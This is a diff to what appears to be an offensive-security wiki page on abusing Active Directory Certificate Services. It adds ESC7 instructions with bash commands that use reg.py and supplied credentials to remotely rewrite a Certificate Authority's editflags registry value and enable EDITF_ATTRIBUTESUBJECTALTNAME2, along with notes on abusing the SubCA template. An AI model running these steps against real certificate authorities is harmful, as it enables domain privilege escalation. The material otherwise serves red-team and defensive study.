@@ -118,7 +118,22 @@ Currently, the best resources for manually abusing this are&#x20;
 
 ### Certificate Authority (ESC7)
 
-When it is not possible to restart the `CertSvc` service to enable the `EDITF_ATTRIBUTESUBJECTALTNAME2 attribute`,the built-in template **SubCA** can be usefull.
+If sufficient rights are obtained over the Certificate Authority (Access Controls, local admin account, ...) an attacker could remotely edit the registries, enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` attribute, restart the `CertSvc` service,  and abuse [ESC6 (CA configuration abuse)](ca-configuration.md).
+
+```bash
+## Beware: change placeholder values CA-NAME, VALUE, NEW_VALUE
+
+# query flags
+reg.py 'DOMAIN'/'USER':'PASSWORD'@'CA_IP' query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags
+
+# bitwise or to set the flag if not already (nothing changed if already set)
+python3 -c print("NEW_VALUE:", VALUE | 0x40000)
+
+# write flags
+reg.py 'DOMAIN'/'USER':'PASSWORD'@'CA_IP' add-keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags -vd NEW_VALUE
+```
+
+When it is not possible to restart the `CertSvc` service to enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` attribute,the built-in template **SubCA** can be usefull.
 
 It is vulnerable to the ESC1 attack, but only **Domain Admins** and **Enterprise Admins** can enroll in it. If a standard user try to enroll in it with [Certipy](https://github.com/ly4k/Certipy), he will encounter a `CERTSRV_E_TEMPLATE_DENIED` errror and will obtain a request ID with a corresponding private key.
 
